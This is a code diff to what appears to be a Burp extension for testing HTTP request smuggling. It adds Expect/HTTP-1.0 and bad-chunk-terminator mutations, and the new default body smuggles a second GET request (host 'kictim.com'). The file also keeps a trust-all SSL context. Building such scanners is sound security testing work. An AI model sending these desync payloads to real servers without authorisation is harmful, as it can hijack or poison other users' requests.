@@ -24,6 +24,7 @@ DEFAULT_REPLAY_COUNT = 100
 DEFAULT_CONNECTIONS = 100
 MAX_LOG_LINES = 2000
 MUTATION_EXPECT = "CL Expect"
+MUTATION_EXPECT_10 = "EXPECT-1.0"
 MUTATION_HEAD = "CL HEAD"
 MUTATION_CL_OPTIONS = "CL OPTIONS"
 MUTATION_CL_TRACE = "CL TRACE"
@@ -38,25 +39,29 @@ MUTATION_TE_GET = "TE GET"
 MUTATION_TE_HEAD = "TE HEAD"
 MUTATION_TE_CONNECT = "TE CONNECT"
 MUTATION_TE_VALID_TERM = "TE-ValidTerminator"
+MUTATION_TE_BAD_TERM = "TE-Bad-Terminator"
 
 DEFAULT_CL_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
 DEFAULT_TE_BODY = "22\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
 DEFAULT_CL_VALID_TERM_BODY = "\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x"
 DEFAULT_TE_VALID_TERM_BODY = "20\r\n0\r\n\r\nGET /test%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
+DEFAULT_TE_BAD_TERM_BODY = "\r\n2;\nxx\r\n30\r\nGET /ad%xx HTTP/1.1\r\nHost: kictim.com\r\n\r\n0\r\n\r\n0\r\n\r\n"
 
 CL_MUTATIONS = [
-    MUTATION_EXPECT, MUTATION_HEAD, MUTATION_CL_OPTIONS, MUTATION_CL_TRACE,
-    MUTATION_CL_GET, MUTATION_CL_CONNECT, MUTATION_H2_UPGRADE,
-    MUTATION_CL_BLANK, MUTATION_CL_VALID_TERM,
+    MUTATION_EXPECT, MUTATION_EXPECT_10, MUTATION_HEAD, MUTATION_CL_OPTIONS,
+    MUTATION_CL_TRACE, MUTATION_CL_GET, MUTATION_CL_CONNECT,
+    MUTATION_H2_UPGRADE, MUTATION_CL_BLANK, MUTATION_CL_VALID_TERM,
 ]
 TE_MUTATIONS = [
     MUTATION_TE_OPTIONS, MUTATION_TE_TRACE, MUTATION_TE_GET,
     MUTATION_TE_HEAD, MUTATION_TE_CONNECT, MUTATION_TE_VALID_TERM,
+    MUTATION_TE_BAD_TERM,
 ]
 ALL_MUTATIONS = CL_MUTATIONS + TE_MUTATIONS
 
 MUTATION_METHODS = {
     MUTATION_EXPECT: "POST",
+    MUTATION_EXPECT_10: "POST",
     MUTATION_HEAD: "HEAD",
     MUTATION_CL_OPTIONS: "OPTIONS",
     MUTATION_CL_TRACE: "TRACE",
@@ -71,6 +76,7 @@ MUTATION_METHODS = {
     MUTATION_TE_HEAD: "HEAD",
     MUTATION_TE_CONNECT: "CONNECT",
     MUTATION_TE_VALID_TERM: "POST",
+    MUTATION_TE_BAD_TERM: "POST",
 }
 
 MUTATION_DEFAULT_BODIES = {}
@@ -80,6 +86,7 @@ MUTATION_DEFAULT_BODIES[MUTATION_CL_VALID_TERM] = DEFAULT_CL_VALID_TERM_BODY
 for _m in TE_MUTATIONS:
     MUTATION_DEFAULT_BODIES[_m] = DEFAULT_TE_BODY
 MUTATION_DEFAULT_BODIES[MUTATION_TE_VALID_TERM] = DEFAULT_TE_VALID_TERM_BODY
+MUTATION_DEFAULT_BODIES[MUTATION_TE_BAD_TERM] = DEFAULT_TE_BAD_TERM_BODY
 
 # Shared trust-all SSL context (created once, reused for all sockets)
 _SSL_CTX = None
@@ -364,6 +371,8 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation
     method = MUTATION_METHODS.get(mutation, "POST")
     parts = headers[0].split(" ")
     parts[0] = method
+    if mutation == MUTATION_EXPECT_10 and len(parts) >= 3:
+        parts[2] = "HTTP/1.0"
     headers[0] = " ".join(parts)
     new_headers = [headers[0]]
     skip_headers = ["expect:", "content-length:", "transfer-encoding:",
@@ -378,7 +387,7 @@ def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation
         if not skip:
             new_headers.append(h)
     # Mutation-specific headers
-    if mutation == MUTATION_EXPECT:
+    if mutation == MUTATION_EXPECT or mutation == MUTATION_EXPECT_10:
         new_headers.append("Expect: 100-Continue")
     if mutation == MUTATION_H2_UPGRADE:
         new_headers.append("Connection: Upgrade, HTTP2-Settings")
